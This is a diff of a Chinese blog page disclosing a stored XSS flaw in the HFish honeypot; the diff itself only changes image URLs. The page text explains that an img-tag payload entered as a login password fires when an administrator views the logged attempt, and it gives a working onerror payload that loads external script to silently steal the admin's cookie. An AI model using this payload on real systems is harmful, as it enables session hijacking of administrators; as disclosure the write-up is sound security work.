@@ -87,15 +87,15 @@
 <meta property="og:site_name" content="Assassins 小白">
 <meta property="og:description" content="我本桀骜少年臣，不信鬼神不信人">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://i.loli.net/2020/05/13/jVu9rQ7mt43SPKd.png">
-<meta property="og:image" content="https://i.loli.net/2020/03/15/GIQbsod6tqE7B9p.png">
-<meta property="og:image" content="https://i.loli.net/2020/03/15/dKUfHzxp3S9WOIq.png">
-<meta property="og:image" content="https://user-images.githubusercontent.com/39295496/76696017-94d61200-66c1-11ea-9223-d6bb15fd8758.png">
-<meta property="og:updated_time" content="2020-05-13T15:50:23.583Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200514000448.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200514000550.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200514000623.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200514000810.png">
+<meta property="og:updated_time" content="2020-05-13T16:08:29.851Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="HFish存在通用Xss【0day】">
 <meta name="twitter:description" content="我本桀骜少年臣，不信鬼神不信人">
-<meta name="twitter:image" content="https://i.loli.net/2020/05/13/jVu9rQ7mt43SPKd.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200514000448.png">
 
 
 
@@ -312,18 +312,18 @@
 <h2 id="HFish介绍："><a href="#HFish介绍：" class="headerlink" title="HFish介绍："></a>HFish介绍：</h2><blockquote>
 <p> <strong><code>HFish</code></strong> 是一款基于 <strong><code>Golang</code></strong> 开发的跨平台多功能主动诱导型开源蜜罐框架系统，为了企业安全防护做出了精心的打造，全程记录黑客攻击手段，实现防护自主化</p>
 </blockquote>
-<p><img src="https://i.loli.net/2020/05/13/jVu9rQ7mt43SPKd.png" alt="hfish.png"></p>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200514000448.png" alt></p>
 <h2 id="通用Xss，版本0-5-1之后应该修复"><a href="#通用Xss，版本0-5-1之后应该修复" class="headerlink" title="通用Xss，版本0.5.1之后应该修复"></a>通用Xss，版本0.5.1之后应该修复</h2><p>这里测试 在输入密码的时候，密码内容填写使用img标签的xss代码会被解析，导致触发xss攻击</p>
 <p>用户这边输入的信息其实在后台是在 <code>pre</code> 标签里面显示出来的，试了一些其他标签，都不会解析，但是img标签不知道为什么逃逸出来了，然后就开始利用img标签来做文章…ing</p>
 <p>我们访问web蜜罐界面，在输入的密码里面，插入一个img恶意代码</p>
-<p><img src="https://i.loli.net/2020/03/15/GIQbsod6tqE7B9p.png" alt="76696266-6443a780-66c4-11ea-9ebd-53c834412a67.png"></p>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200514000550.png" alt></p>
 <p>然后控制台管理员去查看详细信息的时候，会被触发</p>
-<p><img src="https://i.loli.net/2020/03/15/dKUfHzxp3S9WOIq.png" alt="76695974-9f43dc00-66c0-11ea-8229-c2a94608cb27.png"></p>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200514000623.png" alt></p>
 <p>再构造一下语句，使用下面的语句，不会把图片显示出来，还能执行JavaScript代码，这样管理员访问，我们就能悄无声息的打到cookie</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=with(document)body.appendChild(document.createElement(&apos;script&apos;)).src=&quot;js地址&quot; height=&quot;0&quot; width=&quot;0&quot;&gt;</span><br></pre></td></tr></table></figure>
 
 <p>xss平台接收到的cookie信息</p>
-<p><img src="https://user-images.githubusercontent.com/39295496/76696017-94d61200-66c1-11ea-9223-d6bb15fd8758.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200514000810.png" alt></p>
 <p>telnet、ftp、ssh…其他类型也一样</p>
 
       
